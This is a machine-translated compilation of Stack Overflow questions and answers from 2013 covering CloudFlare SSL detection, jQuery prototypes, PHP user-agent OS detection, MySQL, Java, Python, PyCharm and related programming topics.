```

# php - 确定访问者是否在 CloudFlare Pro 上通过 SSL 连接

> ID：15845903
> 
> 赞同：11
> 
> 时间：2013-04-06T01:05:03.727
> 
> 标签：php, cloudflare

我们有一个在 CloudFlare Pro 上运行的站点，它使用他们提供的证书进行一键式加密。我们的网站为用户提供“可选”SSL。由于它是一个论坛，我们目前运行一个代理脚本来检测发布的图像是否使用 HTTPS 协议，并通过在我们服务器上运行的脚本自动代理图像以维护安全和我们可爱的绿色锁！

我现在唯一的问题是，当用户不使用 HTTPS 时，这会在我们的服务器上引入不必要的负载，因此我们希望能够检测他们是否使用。但是，由于 CloudFlare 服务器实际上是通过 HTTP 连接到我们的服务器（因为我们在 CloudFlare 上使用一键式 SSL），所以我们的 PHP 脚本始终报告 HTTP，并且即使用户使用 HTTPS 也从不代理图像。有没有办法让 CloudFlare 报告用户正在使用 SSL？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-04-06T01:13:07.690

找到了我的答案，他们发送了一个 header `X-FORWARDED-PROTO`。它`https`适用于 SSL 和`http`正常情况！

# javascript - 当你 .extend() 一个带有自身的 obj 原型时会得到什么

> ID：15845905
> 
> 赞同：0
> 
> 时间：2013-04-06T01:05:13.970
> 
> 标签：javascript, jquery

我正在查看一些代码，只是为了确保我不会因为错过显而易见的事情而失去理智，因为这对我来说似乎没有任何收获。似乎是对 $.extend() 的浪费使用，但也许有人可以阐明我在继承中可能遗漏的一些东西。

所以，我们有这个。

```
_letsCreateNameSpace('US.somenew.obj');
//this is based on S.stoyanov namespace pattern, what this _letsCreateNameSpace does. 
```

然后我在一些代码中看到了这一点，这对我来说没有意义。

```
US.somenew.obj = function(){
  // some this var assignments.
  this.blah = $foo;
}

// this usage of extend escapes me. I don't see a need at this point here.
$.extend(US.somenew.obj.prototype, {
  // a bunch of new methods

} 
```

我完全看不到使用 $.extend() 而不是以下内容的好处，因为除了它本身之外没有任何扩展。

```
 US.somenew.obj.prototype = {
   // a bunch of new methods
 } 
```

没有“深度”扩展或任何东西..看起来像是无缘无故扩展原型的冗长方式。

我错过了什么吗？我在这里缺少一些“树后的森林”方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T01:11:27.430

`$.extend`将复制到`prototype`给定的方法**而不**覆盖`prototype`对象本身。例如，如果您有：

```
// inheritance
US.somenew.obj.prototype = myproto;

US.somenew.obj.prototype =  {
   // you lost the inheritance with `myproto`, here
} 
```

使用`$.extend`将防止这种情况。另外，您不会丢失一些默认属性。例如，`constructor`：

```
US.somenew.obj = function () {};

US.somenew.obj.prototype = {};

var o = new US.somenew.obj();

console.log(o.constructor === US.somenew.obj) // false, in that case is `Object` 
```

在哪里：

```
US.somenew.obj = function () {};

$.extend(US.somenew.obj.prototype, {});

var o = new US.somenew.obj();

console.log(o.constructor === US.somenew.obj) // true 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T01:08:58.433

我认为唯一的好处是保持原始原型对象完好无损，而不是用新对象覆盖它。
该`constructor`属性将引用正确的函数 ( `US.somenew.obj`) 而不是引用`Object`. 当然，您可以`.prototype.constructor`正确地重新分配（并且经常这样做），但是您可以通过扩展现有对象来避免这种情况。

从编码风格的角度来看，这似乎也很有意义：通常您不想*替换*原型，而是想为其*添加*属性。

# java - 可交互图像

> ID：15845906
> 
> 赞同：1
> 
> 时间：2013-04-06T01:05:28.360
> 
> 标签：java, swing, graphics, click, mouse

我已经有一个使用这张图片的程序，但是我将如何对其进行编程，以便用户可以单击每个单独的蓝色方块并接收响应？我已经尝试将图像拆分为单独的图像，但我不确定如何使其可点击。

这是图片：（ [来源：][[aviationexplorer.com](http://www.aviationexplorer.com/airline_aircraft_seat_maps/delta_airlines_aircraft_seating_maps/d767300.gif)][）][![一只忙碌的猫](https://i.stack.imgur.com/0L1v1.gif)](https://i.stack.imgur.com/0L1v1.gif)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T01:06:18.053

您没有告诉我们您的 GUI 库是什么，但如果是 Swing，那么答案很简单：使用`MouseListener`. 实现的细节当然取决于程序的结构。

# entity-framework-5 - 如何在多台服务器上执行实体框架 5 的有效部署

> ID：15845907
> 
> 赞同：0
> 
> 时间：2013-04-06T01:05:30.933
> 
> 标签：entity-framework-5

如何在多台服务器上执行实体框架的有效部署？

# regex - 通过简单的 2 种情况匹配正则表达式：

> ID：15845909
> 
> 赞同：0
> 
> 时间：2013-04-06T01:05:31.997
> 
> 标签：regex, expression, pascal, fpc

我正在尝试在 FPC (Free Pascal) 中使用正则表达式模式 - 更多信息：[http ://wiki.freepascal.org/IDE_regular_expressions](http://wiki.freepascal.org/IDE_regular_expressions)

然而！我无法确定如何匹配 3 或 4 小写 (az) 字符链的第一次出现（如果有）。

然后我将继续尝试相同的表达式，但这次允许大写和数字组成 3or4 字符链。

帮助赞赏！:]

* * *

例如（我尝试过的事情+示例）：

```
s := 'My Name';
// I want the 'ame' portion 1st since there exists a consecutive string of 3 lowercase chars.

// Attempts:    
SplitRegExpr('[[:alnum:]]{3,4}');
SplitRegExpr('[a-z]{3,4}');
SplitRegExpr('[[:alnum:]]{3,4}?'); 
```

回应 Ken White，我认为这是正确的链接，不是吗？ [http://www.gnu-pascal.de/gpc/RegEx.html](http://www.gnu-pascal.de/gpc/RegEx.html) 我理解这些定义，但我看不到如何正确使用它们来创建（例如我想要做的）匹配模式和返回什么从他们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-12-10T09:59:59.003

这是一个提取所有 3 或 4 个小写字符序列的程序。

```
{$APPTYPE CONSOLE}
{$IFDEF FPC}{$MODE DELPHI}{$ENDIF}

uses
  regexpr;

var
  expr: TRegExpr;

begin
  expr := TRegExpr.Create;

  expr.Expression := '[a-z]{3,4}';

  if expr.Exec('My Name is Bunny.') then
    repeat
      WriteLn(expr.Match[0]);
    until not expr.ExecNext;

  expr.Free;
  ReadLn;
end. 
```

# mysql - 如何根据条件检索所有记录

> ID：15845912
> 
> 赞同：0
> 
> 时间：2013-04-06T01:06:03.270
> 
> 标签：mysql, sql, sql-server, sql-server-2008

![数据库记录](https://i.stack.imgur.com/MvlKd.png)

我在下面有一个表格，其中每个 N_ID（即 43、54、32、46 和 24）通常有 3 条记录。但由于某种原因，“21 和 39”的 N_ID 只有一条记录。

要求：通过排除 C_Type 查询所有记录！= 2，然后状态应为 1。

使用的查询：

```
Select A.N_ID, A.C_Type, A.C_File_Type, A.Status 
FROM TABLE A 
where A.Config_Type != 2 
      AND A.Status = 1 
      AND EXISTS (Select 1 
                  from TABLE B 
                  WHERE A.N_ID = B.N_ID Group By B.N_ID, B.C_Type, B.Status 
                  HAVING count(B.Status) > 1
                  ) 
```

输出：除了 C_Type = 2，我得到了所有预期的记录。

现在的问题是如何更改现有查询以获取 N_ID='21, 39' 的附加记录？由于这些记录没有作为我的查询的一部分进行检索。

除了记录 N_ID = 21、39 之外，我从上面的查询中获得的数据表，这些数据没有被检索到。我也想要那些突出显示的记录。

![新表](https://i.stack.imgur.com/MvlKd.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:35:33.333

我无法理解的目的

```
 AND EXISTS (Select 1 
              from TABLE B 
              WHERE A.N_ID = B.N_ID Group By B.N_ID, B.C_Type, B.Status 
              HAVING count(B.Status) > 1
              ) 
```

在查询中，因为我们正在检查 B 中的外部 A 的 N_ID，同一个表的 N_ID 将永远存在。

因此，您可以避免这种存在条件，并且可以简单地将查询编写为

```
 Select A.N_ID, A.C_Type, A.C_File_Type, A.Status 
      FROM TABLE A 
       where A.Config_Type != 2 
        AND A.Status = 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T01:47:26.387

如果删除 EXISTS 查询中的“HAVING count(B.Status) > 1”会发生什么？这将过滤掉根据 GROUP BY 分组时导致 NULL 状态的记录。我认为它没有任何作用，因为 GROUP BY 已经这样做了。

# java - int[] 到 BufferedImage

> ID：15845919
> 
> 赞同：0
> 
> 时间：2013-04-06T01:06:41.523
> 
> 标签：java, exception, int, bufferedimage, raster

我正在尝试过滤图像。首先，我将 RGB 值放入`int[][]`其中，然后进行过滤。在下一步中，我必须转换`int[][]`为`int[]`，最后我想再次显示新图像。这是我的代码：

```
 int row,col,count=0;
          int[] pixels = new int[width*height];

            while(count!=(pixels.length)){   
                for(row=0;row<height;row++){
                     for(col=0;col<width;col++){
                         pixels[count] = imageArray[row][col];
                         count++;
                     }
                }
            }

             BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
             WritableRaster raster = (WritableRaster) image.getData();

             raster.setPixels(0,0,width,height,pixels); //The problem appear in this line 
```

这是我的错误。

> 线程“main”中的异常 java.lang.ArrayIndexOutOfBoundsException: java.awt.image.SinglePixelPackedSampleModel.setPixels(Unknown Source) at java.awt.image.WritableRaster.setPixels(Unknown Source) 的 181000

我检查了类型，两个数组的大小，我不知道我能做什么。

第一个数组 int[][] 使用以下代码创建：

```
int[][] imageArray = new int[height][width]; //...dar tamaño al array donde guardaremos la imagen

          for (int row = 0; row < height; row++) { //en este doble bucle vamos guardando cada pixel
             for (int col = 0; col < width; col++) {

                imageArray[row][col] = image.getRGB(col, row);
                     }
                  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:21:52.607

Java 中的数组是从零开始的，因此

```
int[] array = {1,2,3}; 
```

长度为 3，但最大元素引用为 2 和

```
while( count <= array.length ) {
    System.out.println( array[count] );
    ++count;
} 
```

将始终超出数组，因为直到 count 为 == array.length 或 3 并且 array[3] 不存在之前 while 不会失败。

`while( count < array.length )`改为使用

# java - Java - 向下转换为任意类？

> ID：15845922
> 
> 赞同：0
> 
> 时间：2013-04-06T01:07:16.707
> 
> 标签：java, downcast

我正在尝试实现此代码：

```
 public void ActionTypeOne {

   doSomething(ActionType1A action) { ... }
   doSomething(ActionType1B action) { ... }

  } 
```

...

```
 public void register(Action action) {

        if (action.getClass().equals(ActionType1A) || action.getClass().equals(ActionType1b)) {
            ActionTypeOne.doSomething(action);
        }

   } 
```

由于 ActionTypeOne 没有实现 doSomething(Action)，而只是 doSomething(ActionType1A) 和 doSomething(ActionType1B)，所以这段代码不会编译。

但是，由于事先的代码，我知道我的对象绝对是这些类型之一。我可以将其拆分并显式转换为我的两个 ActionType 之一，但这很麻烦。

我可以强制这条线：

```
ActionTypeOne.doSomething(action) 
```

根据动作类调用 ActionTypeOne 中的正确方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T22:31:48.683

您可以使用反射来获取这些方法，然后调用它们。

大约代码：

```
//in class init or static
Class []params1 = new Class {ActionType1A};
Method doSomethingActionType1A = ActionTypeOne.class.getDeclaredMethod("doSomething", params1); 
```

//...等 // 如果你有超过 3 个，你可以将它们添加到哈希映射中，以根据类名获取正确的方法

//当你需要调用时 - 通过 if 或 hash table 获取方法然后调用它

```
method1.invoke(Object obj, Object... args); 
```

这将作为调用仅在运行时检查实际对象的类型是否正确。但代码会稍微慢一些。除非您关心几个 CPU 周期或有 1,000 次调用，否则这不是问题

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T01:24:35.137

您必须根据您确定对象实例化的类显式（向下）转换：

```
public void register(Action action) {
    if (action instanceof ActionType1A) {
        ActionTypeOne.doSomething((ActionType1A) action);
    } else if (action instanceof ActionType1B) {
        ActionTypeOne.doSomething((ActionType1B) action);
    }
} 
```

# php - 确定操作系统是否为 Mac

> ID：15845928
> 
> 赞同：11
> 
> 时间：2013-04-06T01:08:34.970
> 
> 标签：php, user-agent

我最近一直在做很多谷歌搜索，试图找到一个简单易用的 php 脚本，该脚本将识别用户是否在 Mac 上。

我想用它来告诉用户我告诉他们的键盘快捷键是“控制”还是“命令”。我不需要知道浏览器或任何东西，只要计算机是 Mac。

这是我要问的可能的大纲：

```
if (operating_system == Mac)
{
    echo "command";
}
else
{
    echo "control";
} 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-04-06T01:11:18.690

创建页面：identifier.php

```
<?php
$user_agent = getenv("HTTP_USER_AGENT");

if(strpos($user_agent, "Win") !== FALSE)
$os = "Windows";
elseif(strpos($user_agent, "Mac") !== FALSE)
$os = "Mac";
?> 
```

然后将其包含在您网站的标题中。

之后，您可以像这样使用它：

```
<?php
if($os === "Windows")
{

}
elseif($os === "Mac")
{

} 
?> 
```

编辑：

对于 Windows 手机：

```
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'windows phone os') > 0) {
    $mobile_browser = 1;
  } 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-06T01:25:12.867

```
 <?php

    function getBrowserOS() { 

        $user_agent     =   $_SERVER['HTTP_USER_AGENT']; 
        $browser        =   "Unknown Browser";
        $os_platform    =   "Unknown OS Platform";

        // Get the Operating System Platform

            if (preg_match('/windows|win32/i', $user_agent)) {

                $os_platform    =   'Windows';

                if (preg_match('/windows nt 6.2/i', $user_agent)) {

                    $os_platform    .=  " 8";

                } else if (preg_match('/windows nt 6.1/i', $user_agent)) {

                    $os_platform    .=  " 7";

                } else if (preg_match('/windows nt 6.0/i', $user_agent)) {

                    $os_platform    .=  " Vista";

                } else if (preg_match('/windows nt 5.2/i', $user_agent)) {

                    $os_platform    .=  " Server 2003/XP x64";

                } else if (preg_match('/windows nt 5.1/i', $user_agent) || preg_match('/windows xp/i', $user_agent)) {

                    $os_platform    .=  " XP";

                } else if (preg_match('/windows nt 5.0/i', $user_agent)) {

                    $os_platform    .=  " 2000";

                } else if (preg_match('/windows me/i', $user_agent)) {

                    $os_platform    .=  " ME";

                } else if (preg_match('/win98/i', $user_agent)) {

                    $os_platform    .=  " 98";

                } else if (preg_match('/win95/i', $user_agent)) {

                    $os_platform    .=  " 95";

                } else if (preg_match('/win16/i', $user_agent)) {

                    $os_platform    .=  " 3.11";

                }

            } else if (preg_match('/macintosh|mac os x/i', $user_agent)) {

                $os_platform    =   'Mac';

                if (preg_match('/macintosh/i', $user_agent)) {

                    $os_platform    .=  " OS X";

                } else if (preg_match('/mac_powerpc/i', $user_agent)) {

                    $os_platform    .=  " OS 9";

                }

            } else if (preg_match('/linux/i', $user_agent)) {

                $os_platform    =   "Linux";

            }

            // Override if matched

                if (preg_match('/iphone/i', $user_agent)) {

                    $os_platform    =   "iPhone";

                } else if (preg_match('/android/i', $user_agent)) {

                    $os_platform    =   "Android";

                } else if (preg_match('/blackberry/i', $user_agent)) {

                    $os_platform    =   "BlackBerry";

                } else if (preg_match('/webos/i', $user_agent)) {

                    $os_platform    =   "Mobile";

                } else if (preg_match('/ipod/i', $user_agent)) {

                    $os_platform    =   "iPod";

                } else if (preg_match('/ipad/i', $user_agent)) {

                    $os_platform    =   "iPad";

                }

        // Get the Browser

            if (preg_match('/msie/i', $user_agent) && !preg_match('/opera/i', $user_agent)) { 

                $browser        =   "Internet Explorer"; 

            } else if (preg_match('/firefox/i', $user_agent)) { 

                $browser        =   "Firefox";

            } else if (preg_match('/chrome/i', $user_agent)) { 

                $browser        =   "Chrome";

            } else if (preg_match('/safari/i', $user_agent)) { 

                $browser        =   "Safari";

            } else if (preg_match('/opera/i', $user_agent)) { 

                $browser        =   "Opera";

            } else if (preg_match('/netscape/i', $user_agent)) { 

                $browser        =   "Netscape"; 

            } 

            // Override if matched

                if ($os_platform == "iPhone" || $os_platform == "Android" || $os_platform == "BlackBerry" || $os_platform == "Mobile" || $os_platform == "iPod" || $os_platform == "iPad") { 

                    if (preg_match('/mobile/i', $user_agent)) {

                        $browser    =   "Handheld Browser";

                    }

                }

        // Create a Data Array

            return array(
                'browser'       =>  $browser,
                'os_platform'   =>  $os_platform
            );

    } 

    $user_agent     =   getBrowserOS();

    $device_details =   "<strong>Browser: </strong>".$user_agent['browser']."<br /><strong>Operating System: </strong>".$user_agent['os_platform']."";

    print_r($device_details);

    echo("<br /><br /><br />".$_SERVER['HTTP_USER_AGENT']."");

    ?> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-06T01:30:21.867

```
function getUserOS(){
$osList = array
(
    'Windows 7' => 'windows nt 6.1',
    'Windows Vista' => 'windows nt 6.0',
    'Windows Server 2003' => 'windows nt 5.2',
    'Windows XP' => 'windows nt 5.1',
    'Windows 2000 sp1' => 'windows nt 5.01',
    'Windows 2000' => 'windows nt 5.0',
    'Windows NT 4.0' => 'windows nt 4.0',
    'Windows Me' => 'win 9x 4.9',
    'Windows 98' => 'windows 98',
    'Windows 95' => 'windows 95',
    'Windows CE' => 'windows ce',
    'Windows (version unknown)' => 'windows',
    'OpenBSD' => 'openbsd',
    'SunOS' => 'sunos',
    'Ubuntu' => 'ubuntu',
    'Linux' => '(linux)|(x11)',
    'Mac OSX Beta (Kodiak)' => 'mac os x beta',
    'Mac OSX Cheetah' => 'mac os x 10.0',
    'Mac OSX Puma' => 'mac os x 10.1',
    'Mac OSX Jaguar' => 'mac os x 10.2',
    'Mac OSX Panther' => 'mac os x 10.3',
    'Mac OSX Tiger' => 'mac os x 10.4',
    'Mac OSX Leopard' => 'mac os x 10.5',
    'Mac OSX Snow Leopard' => 'mac os x 10.6',
    'Mac OSX Lion' => 'mac os x 10.7',
    'Mac OSX (version unknown)' => 'mac os x',
    'Mac OS (classic)' => '(mac_powerpc)|(macintosh)',
    'QNX' => 'QNX',
    'BeOS' => 'beos',
    'OS2' => 'os/2',
    'SearchBot'=>'(nuhk)|(googlebot)|(yammybot)|(openbot)|(slurp)|(msnbot)|(ask jeeves/teoma)|(ia_archiver)'
);

$useragent = $_SERVER['HTTP_USER_AGENT'];
$useragent = strtolower($useragent);

foreach($osList as $os=>$match) {
    if (preg_match('/' . $match . '/i', $useragent)) {
        break;  
    }
    else
    {
        //$os = "Not automatically detected.<br />$useragent";  
        $os = "unknown";
    }
}

return $os;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-06T01:13:03.397

不幸的是，这不能*真正*做到。

* * *

为了回答您的问题，而不是深入探讨为什么用户代理嗅探被破坏，这里有一些代码可以满足您的需求：

```
$mactest = strpos($_SERVER["HTTP_USER_AGENT"], 'Macintosh') ? true : false;

if($mactest) {
  do something
} else {
  do something else
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-06T01:10:31.163

试试[`get_browser()`](http://us3.php.net/get_browser)PHP 内置的函数。

```
$browser = get_browser(null, true);
echo "Platform: " . $browser["platform"] . "\n"; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-06T01:12:29.990

看看[http://ellislab.com/codeigniter/user-guide/libraries/user_agent.html](http://ellislab.com/codeigniter/user-guide/libraries/user_agent.html)

根据[从浏览器中检测确切的操作系统版本](https://stackoverflow.com/questions/647969/detect-exact-os-version-from-browser) **简短回答：**完全不能。

**长答案：**

您所拥有的只是 HTTP User-Agent 标头中的信息，该标头通常包含操作系统名称和版本。

通常，在 Mac OS 和 Linux 上运行的浏览器会发送足够的信息来识别确切的操作系统。例如，这是我的 User-Agent 标头：

> Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.7) Gecko/2009030423 Ubuntu/8.10 (intrepid) Firefox/3.0.7

您可以看到我正在运行 Ubuntu 8.10 Intrepid Ibex。

以下是 Firefox 和 Safari 4 Beta 在我的 MacBook Pro 上的报告：

> Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.7) Gecko/2009021906 Firefox/3.0.7
> 
> Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.16 (KHTML, like Gecko) 版本/4.0 Safari/528.16

另一方面，Windows 浏览器通常只报告操作系统版本而不是特定软件包（Pro、Business 等）：

> Mozilla/5.0（Windows；U；Windows NT 5.1；en-US；rv:xxx） Gecko/20041107 Firefox/xx

// 这会帮助你

```
$uagent = $_SERVER['HTTP_USER_AGENT'] . "<br/>";

function os_info($uagent)
{
    // the order of this array is important
    global $uagent;
    $oses   = array(
        'Win311' => 'Win16',
        'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
        'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
        'Win98' => '(Windows 98)|(Win98)',
        'Win2000' => '(Windows NT 5.0)|(Windows 2000)',
        'WinXP' => '(Windows NT 5.1)|(Windows XP)',
        'WinServer2003' => '(Windows NT 5.2)',
        'WinVista' => '(Windows NT 6.0)',
        'Windows 7' => '(Windows NT 6.1)',
        'Windows 8' => '(Windows NT 6.2)',
        'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'OpenBSD' => 'OpenBSD',
        'SunOS' => 'SunOS',
        'Ubuntu' => 'Ubuntu',
        'Android' => 'Android',
        'Linux' => '(Linux)|(X11)',
        'iPhone' => 'iPhone',
        'iPad' => 'iPad',
        'MacOS' => '(Mac_PowerPC)|(Macintosh)',
        'QNX' => 'QNX',
        'BeOS' => 'BeOS',
        'OS2' => 'OS/2',
        'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
    );
    $uagent = strtolower($uagent ? $uagent : $_SERVER['HTTP_USER_AGENT']);
    foreach ($oses as $os => $pattern)
        if (preg_match('/' . $pattern . '/i', $uagent))
            return $os;
    return 'Unknown';
}
echo os_info($uagent); 
```

# python - 如何在 PyCharm 中设置 Python 2 首选项？

> ID：15845929
> 
> 赞同：14
> 
> 时间：2013-04-06T01:08:51.877
> 
> 标签：python, pycharm

**PyCharm**是一个很好的 IDE，但它的代码提示并不那么智能。例如，当我使用它编写 Python2 代码时（我的*解释器路径*的设置可以告诉 PyCharm），我输入***prin***，我希望 PyCharm 给我一个***print***提示，但是，第一个提示是***print()***，这是 Python3 风格的函数**print**。PyCharm 中是否有任何设置可以告诉它在我编写 Python2 代码时不要给我 Python3 提示（并且在我编写 Python3 代码时不要给我 Python2 提示）？

我的 PyCharm 版本是 2.7.1

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-06T03:18:30.590

Perhaps, you should select python 2.x interpreter for the project (File Menu - Settings - Project - Project Interpreter).

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-02-01T10:10:30.840

只需根据需要将 Python 解释器从**3.x**设置为**2.x。**

PyCharm 版本步骤 **：社区版 2016.3.2**

1.  您需要先安装解释器。

2.  然后转到*文件 -> 设置 -> 项目：开发 -> 项目解释器*-> 设置 Python 2.7 [![在此处输入图像描述](https://i.stack.imgur.com/3pN4u.png)](https://i.stack.imgur.com/3pN4u.png)

3.  现在转到*运行->编辑配置*->并在此处设置python解释器2.7，如下面的快照中所示- [![Python 解释器 2.7](https://i.stack.imgur.com/VfQx4.png)](https://i.stack.imgur.com/VfQx4.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-24T04:01:10.087

也许这可以帮助：

运行->编辑配置，将所有Py3替换为Py2

我使用 PyCharm 3.0.1

# python - 在课堂外访问名称混乱名称的最佳方法是什么？

> ID：15845931
> 
> 赞同：3
> 
> 时间：2013-04-06T01:09:35.310
> 
> 标签：python, name-mangling

我想在 Python 中使用名称错位的名称，以避免子类访问该属性。我知道我可以这样做`_classname__attributename`，但根据[文档](https://docs.python.org/3/reference/expressions.html#atom-identifiers)，“如果转换后的名称非常长（超过 255 个字符），则可能会发生实现定义的截断。如果类名仅包含下划线，则不进行任何转换。” 我特别担心“实现定义”部分。似乎也有一些微妙之处。是否有标准库函数可以将类名加上属性名转换为其名称错位等价物？

## 背景

我想装饰一个类的文档字符串，以便能够说明它是否需要某些可选的外部依赖项，以便可以在 doctest 运行器中自动启用或禁用它（完整详细信息在[https://github.com/sympy/sympy /拉/1969](https://github.com/sympy/sympy/pull/1969)）。

理想情况下，要做到这一点，您应该向文档字符串添加一个属性，但 Python 不允许向字符串添加属性。因此，您必须向该类添加一个属性。我需要的是一个不被子类继承的属性，因为文档字符串不是继承的。否则，子类的文档字符串将被错误地修饰。我最初的解决方案是使用一个描述符对象来禁用子类的属性，但是当名称修改之类的东西已经存在并且基本上已经这样做时，这有点复杂，除了这个微妙之处。

# mysql - MYSQL：列数与第 1 行的值数不匹配无法计算

> ID：15845932
> 
> 赞同：0
> 
> 时间：2013-04-06T01:09:44.813
> 
> 标签：mysql

我已经玩了一段时间了，我已经设置了除主键之外的所有内容以允许空值，我尝试删除一些字段，但没有任何效果。

```
call Create_Login('Username', 'Passkey', 'Key', 1, 1, 1); 
```

错误代码：1136。列计数与第 1 行的值计数不匹配 0.078 秒

```
CREATE DEFINER=`testdb`@`%` PROCEDURE `Create_Login`(
_Username varchar(15),
_Password varbinary(160),
_Salt varbinary(110),
_priviledge tinyint(3),
_WorkerID int,
_empID int
)
BEGIN

Insert INTO Login
Values (_Username, _Password, _Salt, _WorkerID, _priviledge, Curdate(), CURDATE(), 
_empID);

END 
```

任何帮助都将不胜感激，我也尝试引用和取消引用到目前为止所有无效的内容。6 个输入值，6 个提供

编辑：我应该添加我尝试过不同的值等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:19:26.940

您的问题来自您的`INSERT`查询。也许您的`INSERT`. BTW 强烈建议在`INSERT`

例如：

```
INSERT INTO table_name (column1, column2, column3,...)
VALUES (value1, value2, value3,...) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:25:22.667

当我单击表格中的一行时，显然发现了问题，这件事变成了一个额外的列。这就是为什么指定值起作用的原因。敏感数据库...

# ruby-on-rails - factorygirl 创建错误

> ID：15845933
> 
> 赞同：0
> 
> 时间：2013-04-06T01:09:48.617
> 
> 标签：ruby-on-rails, rspec, factory-bot

当我在控制台中使用 pry 进行调试时，我运行了brief = Factory(:brief,:project => Factory(:project)) 这个命令。它应该可以工作，但我得到了这个错误。

```
 ActiveRecord::RecordNotUnique: PG::Error: ERROR:  duplicate key value violates unique constraint "index_briefs_on_project_id"
    DETAIL:  Key (project_id)=(15389) already exists.
    : INSERT INTO "briefs" ("project_id", "duration", "brand_name", "brand_info", 
"customer_info", "competitor_info", "desired_impression", "competencies", "preferences",
 "examples", "notes", "created_at", "updated_at", "channel_id") VALUES (15389, 14, NULL, 
'brand info', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
'2013-04-06 01:07:04.717364', '2013-04-06 01:07:04.717364', NULL) RETURNING "id" 
```

为什么会发生此错误，我该如何解决？

编辑：我添加了我的工厂文件

**Brief_factory.rb**

```
Factory.define :brief, :class => Brief do |b|
  b.brand_info 'brand info'
  b.duration 14
end 
```

**project_factory.rb**

```
Factory.define :project, :class => Project do |p|
  p.association :owner, :factory => :customer

  p.title 'project title'
  p.description 'project description'
  p.stage :brief_completed
  p.contest_type :standard

  p.brief Factory.build(:brief)
  p.association :project_type, :factory => :project_type
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T14:17:02.313

看起来`project`工厂正在自动创建`brief`. 因此`Factory(:brief,:project => Factory(:project))`将尝试创建与同一项目相关联的两个简报。第二个失败，因为您对表`project_id`中的列有唯一约束`briefs`。

使用您定义的工厂，您可能可以做您在 Pry 中尝试做的事情：

```
project = Factory(:project)
brief = project.brief 
```

要不就：

```
brief = Factory(:project).brief 
```

# c# - 为什么在 C# 中使用 getter 和 setter

> ID：15845938
> 
> 赞同：0
> 
> 时间：2013-04-06T01:10:43.960
> 
> 标签：c#, class

我使用了两种方法在 C#（和 VB.NET）中设置公共类

## 选项 1 - Setter 和 Getter

```
public class foo
{
  private string _bar;
  public string bar
  {
    get { return _bar; }
    set { _bar = value; }
  }
} 
```

## 选项 2 - 简单的公共类

```
Public Class foo
    Public string bar = "";   
End Class 
```

我已经完成了这两种方式，但使用选项 2 更简单，代码更少 - 而且我看不出在设置或获取类或性能值的其他编码方面的差异 - 两种方式都可以正常工作。

我的问题是“如果在 getter 或 setter 中没有发生其他一些‘特殊的事情’，你为什么要执行选项 1？如果是这样 - 这些原因可能是什么？

我想知道是否有一些“令人信服的论点”可以为此使用 setter 和 getter，如果有，那么“具体为什么？

干杯，查理兹

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T01:16:45.223

对于您的具体情况，拥有一个公共变量会更快（所有 getter 和 setter 在编译时都变成函数）。

不像 Java，如果你有 getter/setter 函数，它们必须被称为函数。如果在某些时候您想将您的公共变量更改为 getter/setter，则代码库不必更改**（但仍必须重新编译）**这意味着如果您正在开发一个库，并且您想要热交换 DLL并且您将公共变量更改为 getter/setter 它将破坏目标程序。

# class - 如何自定义ant编译不同目标JDK版本的Java类？

> ID：15845940
> 
> 赞同：0
> 
> 时间：2013-04-06T01:10:52.007
> 
> 标签：class, netbeans, ant, compilation, target

我正在 Netbeans 中构建一个常规的 Java 应用程序。

假设我想用最新的 JDK 版本编译像这样的“javac -target 1.1 Main.java”的 Main 类和其他类。我该怎么做呢？我可以编辑 build.xml 文件来实现这一点吗？

我想这样做，以便可以使用任何 Java 版本启动应用程序，然后我可以通知用户如果他们不使用最新的 JRE，他们必须更新他们的 Java。

问题的重新表述：当我点击构建按钮时，我想要的是 Netbeans 将带有目标 1.1 的 Main.java 和带有最新 JDK 的其余项目文件编译到一个 jar 中。

# php - mod_rewrite：将文件夹转换为查询参数

> ID：15845944
> 
> 赞同：0
> 
> 时间：2013-04-06T01:11:53.403
> 
> 标签：php, regex, .htaccess

每个人。我想模拟一个像 Youtube 这样的用户系统。例如，如果您键入 youtube.com/，它会将您带到他们的个人资料。我目前正在运行类似的事情。如果您访问 example.com/user/，mod_rewrite 会将 url 更改为 example.com/user/?channel=。这可以正常工作，但我不希望更改 URL 的视觉效果。有什么方法可以在拥有人类可读 URL 的同时将用户名传递给 PHP？这是我的 .htaccess 文件的当前示例

```
RewriteEngine On
